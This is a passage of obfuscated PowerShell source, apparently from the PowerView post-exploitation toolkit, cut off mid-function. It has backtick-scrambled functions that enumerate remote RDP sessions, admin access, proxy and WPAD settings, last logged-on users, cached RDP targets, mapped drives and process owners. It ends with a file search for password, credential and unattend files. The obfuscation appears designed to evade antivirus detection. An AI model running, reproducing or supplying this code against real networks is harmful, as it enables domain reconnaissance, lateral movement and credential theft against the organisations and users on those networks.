        ${cO`mPu`Te`Rn`Ame} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEDE`Nt`i`AL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${psbo`UN`DP`Ara`Me`TErs}['Credential']) {
            ${LO`gOnto`Ken} = InVoke-useRIMP`E`RS`o`N`ATIon -Credential ${cRe`DEn`Tial}
        }
    }

    PROCESS {
        ForEach (${C`Omp`Uter} in ${Co`MP`UT`E`RNaMe}) {

            
            ${H`A`Ndle} = ${WtsAP`i`32}::WTSOpenServerEx(${co`MPUT`Er})

            
            if (${HA`Nd`lE} -ne 0) {

                
                ${pP`SESsi`O`NiNFo} = [IntPtr]::Zero
                ${PCoU`Nt} = 0

                
                ${r`ESU`lt} = ${WT`sa`pI32}::WTSEnumerateSessionsEx(${H`A`NDlE}, [ref]1, 0, [ref]${p`pSe`sS`ioniNFo}, [ref]${PCou`NT});${L`AsteRR`or} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                
                ${ofF`seT} = ${pPSESSiO`NiN`FO}.ToInt64()

                if ((${r`eSu`LT} -ne 0) -and (${OFf`SEt} -gt 0)) {

                    
                    ${IN`c`ReMenT} = ${wts`_`sEss`i`On_`InFo`_1}::GetSize()

                    
                    for (${I} = 0; (${I} -lt ${Pco`UNt}); ${I}++) {

                        
                        ${NeWIn`T`Ptr} = NE`w`-OBjE`Ct SysT`E`m`.intptr -ArgumentList ${O`Ffs`ET}
                        ${in`FO} = ${NEW`inT`Ptr} -as ${wts`_sEs`SIon_`I`Nfo_1}

                        ${rdPs`e`S`siON} = Ne`W-O`B`jECt Ps`objECT

                        if (${I`NFo}.pHostName) {
                            ${Rd`pse`ssion} | AD`D-MEmB`eR n`O`TEpROpErtY 'ComputerName' ${i`NfO}.pHostName
                        }
                        else {
                            
                            ${rdp`SesSI`ON} | A`Dd`-MembER No`TepROP`ER`Ty 'ComputerName' ${coMp`UT`er}
                        }

                        ${r`d`pS`eSSIoN} | AdD`-`M`EMBer nOt`epR`O`perTY 'SessionName' ${i`Nfo}.pSessionName

                        if ($(-not ${I`NFo}.pDomainName) -or (${IN`Fo}.pDomainName -eq '')) {
                            
                            ${rdPS`ES`SiOn} | A`Dd-mEmB`ER nOtE`Pr`OP`ERTy 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            ${RdPSeS`sI`ON} | A`dd-`MEMBer nOTEpRO`P`ERTY 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${rDpS`es`sIOn} | AD`d-MEMb`eR no`TEP`R`oPERTy 'ID' ${In`FO}.SessionID
                        ${RD`psesS`I`on} | a`DD-M`EMb`ER NoTe`PrO`P`erTy 'State' ${in`Fo}.State

                        ${PpBu`F`Fer} = [IntPtr]::Zero
                        ${pBy`TEsreT`U`RNED} = 0

                        
                        
                        ${rEs`U`LT2} = ${w`TsAP`i`32}::WTSQuerySessionInformation(${HAn`d`le}, ${IN`FO}.SessionID, 14, [ref]${ppb`U`FFer}, [ref]${P`BYteSr`e`TUrnED});${LAs`TE`RROR2} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (${r`eSu`lT2} -eq 0) {
                            w`RiTE-`V`eRBO`se "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            ${o`F`FseT2} = ${P`pbUf`FER}.ToInt64()
                            ${nEW`intpt`R2} = N`eW-o`BJeCt SYsteM.In`T`Ptr -ArgumentList ${O`FfSE`T2}
                            ${I`N`Fo2} = ${N`ewINT`PT`R2} -as ${w`Ts`_CLi`ent_AdDREsS}

                            ${SO`UrC`E`iP} = ${i`N`FO2}.Address
                            if (${SOu`RCE`Ip}[2] -ne 0) {
                                ${S`OU`RceIp} = [String]${S`OU`RCeIp}[2]+'.'+[String]${Sou`R`C`Eip}[3]+'.'+[String]${SOuR`cE`ip}[4]+'.'+[String]${sOu`R`ceIP}[5]
                            }
                            else {
                                ${sou`RCE`Ip} = ${nU`Ll}
                            }

                            ${rdpS`Es`S`IOn} | Add-M`EM`BEr nO`TEProP`er`Ty 'SourceIP' ${SOu`R`CEiP}
                            ${r`D`PsEsSiOn}.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            ${rdps`Es`SIoN}

                            
                            ${nu`Ll} = ${wt`S`API32}::WTSFreeMemory(${pP`B`UfFeR})

                            ${OF`F`set} += ${i`Nc`REMe`Nt}
                        }
                    }
                    
                    ${NU`lL} = ${w`TS`API32}::WTSFreeMemoryEx(2, ${ppsESs`Io`NinFO}, ${pco`UNt})
                }
                else {
                    wRIt`E`-V`eRbOSE "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                
                ${nu`LL} = ${wtsa`pi`32}::WTSCloseServer(${Ha`N`dlE})
            }
            else {
                wr`iTe-v`eRbO`sE "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }

    END {
        if (${L`Ogo`N`ToKEN}) {
            INVoKe-Re`V`Ert`ToS`elF -TokenHandle ${LOGO`N`TOK`en}
        }
    }
}


function Te`st`-`A`dmiNaCCess {


    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`MP`U`T`ErnAME} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`ed`En`TiAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${PsBOunD`pa`RAM`eT`erS}['Credential']) {
            ${l`oGOnT`oKen} = iNVOkE-`USe`RImPe`Rs`O`NATioN -Credential ${C`ReDE`N`TIAl}
        }
    }

    PROCESS {
        ForEach (${c`oM`PUTeR} in ${CoM`p`U`T`ErNamE}) {
            
            
            ${Han`d`lE} = ${Advap`i32}::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);${l`AStErR`OR} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            ${iSaD`M`IN} = N`EW`-objecT p`so`BjEct
            ${iS`A`DMIn} | aD`d-Me`mbER NO`TEpr`OP`ERTy 'ComputerName' ${CoM`Put`Er}

            
            if (${HAnD`LE} -ne 0) {
                ${n`UlL} = ${A`dVAP`I32}::CloseServiceHandle(${h`And`LE})
                ${IsA`DM`in} | A`D`D-membER nOTep`Ro`PE`RTY 'IsAdmin' ${t`RuE}
            }
            else {
                WrITe-`Ve`Rb`Ose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                ${iS`A`Dmin} | ADd-`m`Emb`eR nOTe`p`RO`PeRtY 'IsAdmin' ${Fal`sE}
            }
            ${is`ADm`In}.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            ${is`A`DMiN}
        }
    }

    END {
        if (${l`o`GoN`TOken}) {
            iNvOk`e-`REV`eR`TtoSelf -TokenHandle ${L`OGontOK`en}
        }
    }
}


function GE`T-nEtcom`PUTer`si`TE`N`AME {


    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${t`RUE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`OM`puTE`RNa`Me} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedEN`T`IAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${PSb`OUNdP`ARAmete`Rs}['Credential']) {
            ${Log`ont`OK`EN} = in`VoKe-us`E`RIm`PErS`o`Nation -Credential ${C`RE`dENtI`AL}
        }
    }

    PROCESS {
        ForEach (${com`pUter} in ${C`omPute`RNa`ME}) {
            
            if (${COMp`U`T`er} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${I`PA`D`drEss} = ${c`OmP`UTEr}
                ${c`OM`putER} = [System.Net.Dns]::GetHostByAddress(${cOmP`U`T`Er}) | SELeCt-`Ob`jEcT -ExpandProperty Ho`st`NAmE
            }
            else {
                ${I`PAdDRE`sS} = @(r`Es`OL`VE-iPAddR`eSS -ComputerName ${c`oMpUT`eR})[0].IPAddress
            }

            ${P`Tr`INfO} = [IntPtr]::Zero

            ${rE`sUlT} = ${ne`Ta`PI`32}::DsGetSiteName(${com`P`Uter}, [ref]${pt`Ri`NFo})

            ${cO`MP`U`TeRsI`TE} = nE`w-ObJ`ECT ps`ObJEct
            ${cOmpu`Ters`I`Te} | A`DD-m`emb`ER nOtEP`R`OpErTy 'ComputerName' ${CO`Mpu`TEr}
            ${cO`mPU`TeRS`ITe} | Ad`D-`MembeR nOTe`PRoPE`R`Ty 'IPAddress' ${IPA`D`DREsS}

            if (${r`ESULT} -eq 0) {
                ${siTen`A`Me} = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${p`TriN`FO})
                ${c`OmPut`ErSi`Te} | ADD-m`eMb`er nOtE`PROP`E`Rty 'SiteName' ${siTE`N`Ame}
            }
            else {
                wr`iT`e-VEr`BOSe "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                ${c`omP`Ute`RSIte} | adD-`M`e`MbEr no`TEPR`OpE`RTY 'SiteName' ''
            }
            ${cOmPUT`ER`SI`TE}.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            
            ${n`ULL} = ${nEtA`p`I32}::NetApiBufferFree(${p`T`RinfO})

            ${c`Om`pUt`e`RSiTe}
        }
    }

    END {
        if (${l`oGOnToK`en}) {
            IN`VoKE-`ReveRt`TOsE`Lf -TokenHandle ${LoG`O`Nt`OKen}
        }
    }
}


function GET`-wMi`REg`pRo`xY {


    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMP`UTEr`NAMe} = ${e`Nv`:coMpUTern`AMe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDE`NT`I`AL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${C`OM`pUteR} in ${CoMpUT`eR`N`AMe}) {
            try {
                ${W`MIar`gUM`en`TS} = @{
                    'List' = ${t`RuE}
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = ${C`oM`PUteR}
                    'ErrorAction' = 'Stop'
                }
                if (${PSB`OUNDP`ARAM`e`TErS}['Credential']) { ${wMia`R`GUM`e`NtS}['Credential'] = ${CRe`DE`NtiAL} }

                ${rEg`pROvid`er} = geT-w`M`IO`BJE`cT @WmiArguments
                ${k`ey} = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                
                ${hk`cu} = 2147483649
                ${pR`oX`ySerV`eR} = ${reGpr`o`VI`DER}.GetStringValue(${h`Kcu}, ${K`EY}, 'ProxyServer').sValue
                ${Au`T`O`COnfIgurl} = ${RE`GPRoVI`d`Er}.GetStringValue(${h`kCU}, ${k`ey}, 'AutoConfigURL').sValue

                ${wp`Ad} = ''
                if (${AutO`COnFig`UrL} -and (${aU`TocO`NfIg`Url} -ne '')) {
                    try {
                        ${Wp`Ad} = (Ne`w-ObJ`ECT nEt.Webc`LI`ent).DownloadString(${aUt`oC`OnF`iG`Url})
                    }
                    catch {
                        wr`ItE-`WA`R`NiNg "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                    }
                }

                if (${pR`oxYSEr`VeR} -or ${AuT`OCo`N`FIGurl}) {
                    ${O`UT} = ne`W`-ObJ`EcT pS`OB`JECT
                    ${o`Ut} | a`DD-m`EMber NO`TePro`pe`RtY 'ComputerName' ${cO`m`pUTer}
                    ${O`Ut} | ADD`-`MeMbeR NotEP`ROPE`RTy 'ProxyServer' ${pR`Oxy`Se`RVER}
                    ${O`Ut} | add-`meMB`eR nO`TEp`RopERTY 'AutoConfigURL' ${A`UtocON`FIG`URL}
                    ${o`UT} | aDD-M`E`MbEr no`TEP`RO`PertY 'Wpad' ${Wp`Ad}
                    ${o`UT}.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    ${o`UT}
                }
                else {
                    w`RIT`e-WA`RNinG "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                }
            }
            catch {
                WRiTe-`WArn`I`Ng "[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_"
            }
        }
    }
}


function get-wMiREg`L`A`sTL`og`ge`DoN {


    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${t`RuE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`OMputern`A`me} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDENT`iAl} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${C`O`m`puTER} in ${compUTE`R`NAme}) {
            
            ${H`KLm} = 2147483650

            ${wMIA`RGUM`e`NTs} = @{
                'List' = ${t`Rue}
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = ${CoMp`U`TEr}
                'ErrorAction' = 'SilentlyContinue'
            }
            if (${p`SB`OU`NdparAMEt`erS}['Credential']) { ${W`mIar`GU`mENTS}['Credential'] = ${CRede`NT`iAl} }

            
            try {
                ${r`Eg} = G`E`T-WMIoB`JeCT @WmiArguments

                ${k`ey} = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                ${V`Al`UE} = 'LastLoggedOnUser'
                ${lA`STU`SeR} = ${r`EG}.GetStringValue(${Hk`lM}, ${K`ey}, ${V`Alue}).sValue

                ${lA`S`T`LoGgeD`oN} = new`-`ob`jecT PS`obJ`ecT
                ${LasTlo`gGEd`On} | ad`d`-M`eMber nOteP`R`o`PERTY 'ComputerName' ${C`oMP`UTeR}
                ${LAs`TLoGg`edoN} | ADD`-`MeMbEr nO`TEPRo`pERtY 'LastLoggedOn' ${laS`TUS`eR}
                ${LasT`l`oGG`e`dOn}.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                ${last`lo`gGe`dOn}
            }
            catch {
                w`R`ite-waR`NIng "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
            }
        }
    }
}


function get`-wM`IrEGcA`chedRdPcOn`N`eC`T`iOn {


    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`M`PUTerNA`ME} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`E`den`TiaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${COmpu`TEr} in ${CoM`pu`TeRna`me}) {
            
            ${H`kU} = 2147483651

            ${WmiArGUme`N`TS} = @{
                'List' = ${Tr`Ue}
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = ${c`omput`Er}
                'ErrorAction' = 'Stop'
            }
            if (${PS`BOun`dpARAM`etErS}['Credential']) { ${wmIA`RGu`M`E`NTs}['Credential'] = ${CReDE`N`TiAl} }

            try {
                ${r`Eg} = GET-wmI`ob`J`Ect @WmiArguments

                
                ${uSE`R`sIds} = (${r`EG}.EnumKey(${h`Ku}, '')).sNames | wH`eRe-Ob`J`ECT { ${_} -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach (${UsE`RS`Id} in ${use`RsI`Ds}) {
                    try {
                        if (${PS`BO`Und`PARAmeTeRS}['Credential']) {
                            ${uSE`Rn`Ame} = COn`VER`TfrO`m-S`iD -ObjectSid ${us`e`RsID} -Credential ${cr`edEN`TiaL}
                        }
                        else {
                            ${Use`Rn`AmE} = cONVer`Tf`R`OM-`SiD -ObjectSid ${Us`ers`iD}
                        }

                        
                        ${Co`NneCt`IoN`KEys} = ${r`eG}.EnumValues(${H`KU},"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach (${C`ONNecti`oN} in ${c`oNn`ect`iONKEYs}) {
                            
                            if (${COnNE`CT`IOn} -match 'MRU.*') {
                                ${tARGeTsE`R`VeR} = ${R`EG}.GetStringValue(${h`kU}, "$UserSID\Software\Microsoft\Terminal Server Client\Default", ${c`ONNE`CTi`on}).sValue

                                ${foUn`dConne`ct`ION} = NeW-obJ`E`CT PSOb`J`eCT
                                ${Fo`UNdCO`N`N`EctIon} | aD`D-`MemBer NotE`PrOp`e`RtY 'ComputerName' ${c`OmPuTEr}
                                ${FoUNd`c`on`Necti`ON} | ADD-meM`B`er n`oTepR`oPEr`Ty 'UserName' ${us`E`RNAme}
                                ${f`OUN`d`coNnectIon} | a`D`D`-meMBeR noTe`ProPer`Ty 'UserSID' ${U`sersID}
                                ${Found`ConN`Ec`TION} | add-Me`mb`Er nO`TEPRo`Perty 'TargetServer' ${Targe`TSeR`VER}
                                ${F`OUnDco`N`NEcTIon} | Add-`mEM`Ber n`oTEprOpe`RTY 'UsernameHint' ${NU`LL}
                                ${f`ou`N`dCoNNECtioN}.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                ${foUN`Dconn`e`CtI`oN}
                            }
                        }

                        
                        ${S`ER`VErk`EyS} = ${R`EG}.EnumKey(${h`ku},"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach (${s`ER`VeR} in ${SEr`V`e`RKeYs}) {

                            ${usE`R`NAMehInT} = ${r`eG}.GetStringValue(${h`Ku}, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue

                            ${f`oU`NdC`onnEcTIoN} = NeW-`Obj`ecT pso`B`ject
                            ${FoU`N`dcoNNe`ctiOn} | aDd-M`EM`Ber notEpr`OP`ERtY 'ComputerName' ${cOmP`Ut`eR}
                            ${fO`UNDc`oN`NEc`TION} | add-`m`EmBer NOte`pR`o`PertY 'UserName' ${uSER`N`Ame}
                            ${F`Ou`NdcoNnec`Tion} | aD`d-M`eMber nOT`eP`RoPe`Rty 'UserSID' ${US`ers`id}
                            ${fOUn`D`CONn`e`CTIoN} | ad`d-MemB`eR no`TEPr`o`pertY 'TargetServer' ${ser`V`eR}
                            ${Fo`U`N`dcON`NECTion} | A`Dd-`mEmbeR no`T`ePRopeR`TY 'UsernameHint' ${usE`Rn`AmehI`NT}
                            ${FouN`DCo`NN`ECtION}.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            ${FOU`NdcONnecT`i`ON}
                        }
                    }
                    catch {
                        wRITE`-VErBO`se "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                wRit`e`-W`ARNiNg "[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function gET`-wmiR`Egm`ou`NTeDdri`Ve {


    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cO`MputEr`N`AME} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`e`DE`NTIAL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${Comp`U`TeR} in ${cO`mPuT`ErNa`ME}) {
            
            ${h`ku} = 2147483651

            ${wmIArg`UMen`Ts} = @{
                'List' = ${T`Rue}
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = ${CO`m`PUTer}
                'ErrorAction' = 'Stop'
            }
            if (${Psbo`UndPaR`A`met`eRs}['Credential']) { ${W`mIARG`UM`eNts}['Credential'] = ${cRedeNt`I`AL} }

            try {
                ${r`Eg} = GE`T-WMiO`B`jeCT @WmiArguments

                
                ${u`s`er`SiDs} = (${R`eg}.EnumKey(${H`Ku}, '')).sNames | w`Here-o`BjEct { ${_} -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach (${U`Se`RSID} in ${u`SEr`SIDS}) {
                    try {
                        if (${PsB`OU`ND`pa`RAMETERS}['Credential']) {
                            ${us`erN`AmE} = coNVeRt`FR`oM-Sid -ObjectSid ${usE`R`SId} -Credential ${cR`EDent`iAl}
                        }
                        else {
                            ${u`s`e`RNaME} = C`OnvER`T`FROm-S`Id -ObjectSid ${uSE`RS`iD}
                        }

                        ${DRiVel`ET`TErS} = (${r`EG}.EnumKey(${h`KU}, "$UserSID\Network")).sNames

                        ForEach (${dR`iVeLEt`T`Er} in ${drIvE`let`TE`Rs}) {
                            ${provIde`Rna`me} = ${R`eG}.GetStringValue(${h`KU}, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                            ${re`MotEp`ATH} = ${r`eg}.GetStringValue(${H`kU}, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                            ${Dr`Iv`EUsE`RnaMe} = ${R`eg}.GetStringValue(${h`ku}, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                            if (-not ${uSer`Na`mE}) { ${Us`e`RNAmE} = '' }

                            if (${rE`MoTEPa`TH} -and (${R`EMOteP`A`TH} -ne '')) {
                                ${Mo`Unted`Dr`ive} = New-O`B`Ject P`sO`BJeCT
                                ${m`OUnte`dDR`IvE} | aDD-`meMB`eR No`T`Epr`opErTY 'ComputerName' ${coM`p`Ut`eR}
                                ${mOunt`EDDr`iVe} | A`Dd-mEM`B`er NoTEp`RoPer`TY 'UserName' ${USE`RN`Ame}
                                ${mO`U`NTedDRi`Ve} | add-`M`EmbeR notep`R`OpErtY 'UserSID' ${Us`ERsid}
                                ${MO`U`NTED`D`RiVe} | a`dD-Mem`B`er N`OT`EpropErtY 'DriveLetter' ${dRi`VEl`ETTER}
                                ${mOU`Nte`ddRIvE} | ADd-`mEmb`Er n`oT`eP`RoPerty 'ProviderName' ${PrOvIDe`R`NaMe}
                                ${M`OUn`TEdd`Ri`VE} | ADD-`mEm`BER NotepRo`PER`TY 'RemotePath' ${r`emoT`Epath}
                                ${M`ou`NtEDdRIvE} | add-MEm`B`ER n`o`Tep`ROperty 'DriveUserName' ${dRiv`eUSeR`N`AMe}
                                ${mo`UnTE`DDR`IVe}.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                ${m`OU`Nt`EDd`RiVE}
                            }
                        }
                    }
                    catch {
                        wriTE`-vER`BosE "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                wr`iTe-W`Arn`iNG "[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function GeT-`WMIpRoCE`sS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${TR`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoM`pU`T`Ern`Ame} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`en`TIaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${cO`m`PuTER} in ${C`oM`P`UtERNAme}) {
            try {
                ${W`m`IarGuM`ents} = @{
                    'ComputerName' = ${CO`m`PutEr`NaME}
                    'Class' = 'Win32_process'
                }
                if (${ps`BoUnd`P`AraMETerS}['Credential']) { ${wMI`AR`gumeNTS}['Credential'] = ${C`Red`eNTIal} }
                gET`-`wMi`ObjEcT @WmiArguments | f`O`REACH-objE`ct {
                    ${O`w`Ner} = ${_}.getowner();
                    ${P`Ro`CeSs} = n`eW`-O`BJECT PSOBj`e`CT
                    ${pRo`c`ess} | aD`D-mem`BeR NOt`eprOP`e`RTy 'ComputerName' ${CO`mp`Uter}
                    ${pr`oc`EsS} | a`d`D-memBER NO`TE`PrOPeRTY 'ProcessName' ${_}.ProcessName
                    ${P`RocEss} | ADD`-mEM`BeR n`ote`pRoPERTy 'ProcessID' ${_}.ProcessID
                    ${pr`OC`eSS} | A`Dd-MeM`Ber no`T`Epr`operTY 'Domain' ${o`w`NER}.Domain
                    ${pR`OCESs} | A`Dd-me`mBER note`pRope`RTY 'User' ${o`wN`eR}.User
                    ${pROc`ESs}.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    ${pR`ocEsS}
                }
            }
            catch {
                wr`iTe-v`ER`BoSe "[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_"
            }
        }
    }
}


function F`Ind-iNTEres`T`INgFiLe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pA`Th} = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        ${Incl`UDe} = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LastACcE`SS`Ti`Me},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${l`AstW`RITEt`I`ME},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${cr`E`A`TIOnTiME},

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        ${OffIced`o`cs},

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        ${frE`sHe`XeS},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${eX`c`LudE`FoLDerS},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${e`X`cL`U`DEhiDden},

        [Switch]
        ${cHe`CKwr`itE`A`C`CesS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ede`NTiAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SE`AR`cH`ERarGUMents} =  @{
            'Recurse' = ${tr`Ue}
            'ErrorAction' = 'SilentlyContinue'
            'Include' = ${In`C`ludE}
        }
        if (${PsbOUnDpA`RAM`ET`E`RS}['OfficeDocs']) {
            ${SEA`RCH`e`RarguME`NTs}['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif (${psbOUnD`pAR`A`MetE`RS}['FreshEXEs']) {
            
            ${l`ASt`Ac`ce`sSTIme} = (gE`T-D`ATe).AddDays(-7).ToString('MM/dd/yyyy')
            ${sEar`cherAr`GUM`e`NTS}['Include'] = @('*.exe')
        }
        ${sEaR`chErA`RgUm`e`N`TS}['Force'] = -not ${PsB`OUNd`paRAmET`ERs}['ExcludeHidden']

        ${ma`ppeD`C`oMPuTe`RS} = @{}

        function TeSt-wR`I`Te {
            
            [CmdletBinding()]Param([String]${pa`TH})
            try {
                ${fI`LEtEST} = [IO.File]::OpenWrite(${pA`TH})
                ${f`iL`Etest}.Close()
                ${TR`Ue}
            }
            catch {
                ${fal`se}
            }
        }
    }

    PROCESS {
        ForEach (${Targ`Et`paTh} in ${p`Ath}) {
            if ((${TARg`e`T`PAth} -Match '\\\\.*\\.*') -and (${psb`O`UNd`paRAM`eT`erS}['Credential'])) {
                ${ho`sT`CompUT`er} = (ne`W-`O`BjeCt sYs`T`eM.uRi(${t`ArGEtpa`Th})).Host
                if (-not ${mAp`Pe`DcOMPUt`Ers}[${HosT`COMp`UteR}]) {
                    
                    ADD-rEmOTE`CO`N`N`EctiOn -ComputerName ${hOST`COMPu`TeR} -Credential ${cREdENt`i`Al}
                    ${MAP`pe`dcO`M`puTers}[${HoStc`oMp`U`Ter}] = ${tr`UE}
                }
            }

            ${Se`Ar`cHErArGU`men`Ts}['Path'] = ${TaRgE`T`PAtH}
            gE`T`-`cHiLD`ItEm @SearcherArguments | fOr`eaCH`-oB`j`Ect {
                
                ${coN`TI`N`UE} = ${t`RUE}
                if (${psBoun`dp`AR`AMe`TE`Rs}['ExcludeFolders'] -and (${_}.PSIsContainer)) {
                    wriTE`-`V`erbosE "Excluding: $($_.FullName)"
                    ${CoN`TI`Nue} = ${F`AL`SE}
                }
                if (${laSTAcCEsST`I`me} -and (${_}.LastAccessTime -lt ${L`A`sT`ACceSs`TIMe})) {
                    ${COntI`N`UE} = ${F`AlSe}
                }
